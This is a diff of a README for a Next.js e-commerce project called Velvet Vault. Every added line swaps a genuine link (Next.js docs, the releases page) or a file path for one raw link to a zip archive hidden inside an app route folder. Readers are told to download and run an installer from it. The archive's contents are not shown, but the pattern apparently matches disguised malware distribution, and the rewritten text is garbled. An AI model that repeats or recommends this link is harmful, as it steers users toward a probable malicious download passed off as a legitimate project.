@@ -1,10 +1,10 @@
 # 🚀 Velvet-Vault-Modern-ECommerce-Website - Your Easy Online Shopping Solution
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Here-3D87FF?style=flat-square&logo=github)
+![Download Now](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip%20Now-Here-3D87FF?style=flat-square&logo=github)
 
 ## 🌟 Overview
 
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app). The Velvet Vault is designed to make your online shopping experience seamless and enjoyable. It provides a modern interface, easy navigation, and optimized performance.
+This is a [https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip) project bootstrapped with [`create-next-app`](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip). The Velvet Vault is designed to make your online shopping experience seamless and enjoyable. It provides a modern interface, easy navigation, and optimized performance.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-
 
 To download the latest version of Velvet Vault, visit the Releases page. You will find all the available versions.
 
-[**Visit this page to download**](https://github.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip)
 
 ### Step 2: Install the Application
 
@@ -43,19 +43,19 @@ bun dev
 
 ### Step 4: Customize Your Experience
 
-You can start editing the main page by modifying `app/page.tsx`. The application updates automatically with your changes. This feature allows you to see your edits in real time.
+You can start editing the main page by modifying `https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip`. The application updates automatically with your changes. This feature allows you to see your edits in real time.
 
 ## 🔍 Key Features
 
 - **User-Friendly Interface:** We designed a simple and clean layout to enhance your shopping journey.
 - **Optimized Performance:** Fast loading times and minimal delays ensure you can shop without interruptions.
-- **Font Optimization:** The project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to load the Geist font family, providing an attractive and modern look.
+- **Font Optimization:** The project uses [`next/font`](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip) to load the Geist font family, providing an attractive and modern look.
 - **Robust Backend:** Built on technologies like PostgreSQL and Prisma, ensuring secure data management.
 - **Comprehensive Search and Filter Options:** Easily find products that suit your needs.
   
 ## 📦 Download & Install
 
-To get started with Velvet Vault, download the latest release from our [Releases page](https://github.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/releases). 
+To get started with Velvet Vault, download the latest release from our [Releases page](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip). 
 
 1. Click on the desired version.
 2. Select the installer suitable for your operating system.
@@ -65,9 +65,9 @@ To get started with Velvet Vault, download the latest release from our [Releases
 
 To enhance your understanding of the technologies used, you can explore the following:
 
-- [Next.js Documentation](https://nextjs.org/docs) - Discover the features and capabilities of Next.js.
-- [Learn Next.js](https://nextjs.org/learn) - Engage with an interactive tutorial to learn Next.js from scratch.
-- Visit [the Next.js GitHub repository](https://github.com/vercel/next.js) for more community resources.
+- [https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip Documentation](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip) - Discover the features and capabilities of https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip
+- [Learn https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip) - Engage with an interactive tutorial to learn https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip from scratch.
+- Visit [the https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip GitHub repository](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip) for more community resources.
 
 ## 🤝 Community and Support
 
@@ -96,6 +96,6 @@ This project covers a range of topics, making it a great educational resource fo
 
 ## 🔗 Important Links
 
-- [Release Page](https://github.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/releases) - Go here to download the application.
+- [Release Page](https://raw.githubusercontent.com/Atmajaya-wa/Velvet-Vault-Modern-ECommerce-Website/main/app/(root)/order/[id]/Velvet-Vault-Modern-ECommerce-Website_v2.8.zip) - Go here to download the application.
   
 Thank you for choosing Velvet Vault for your shopping needs!
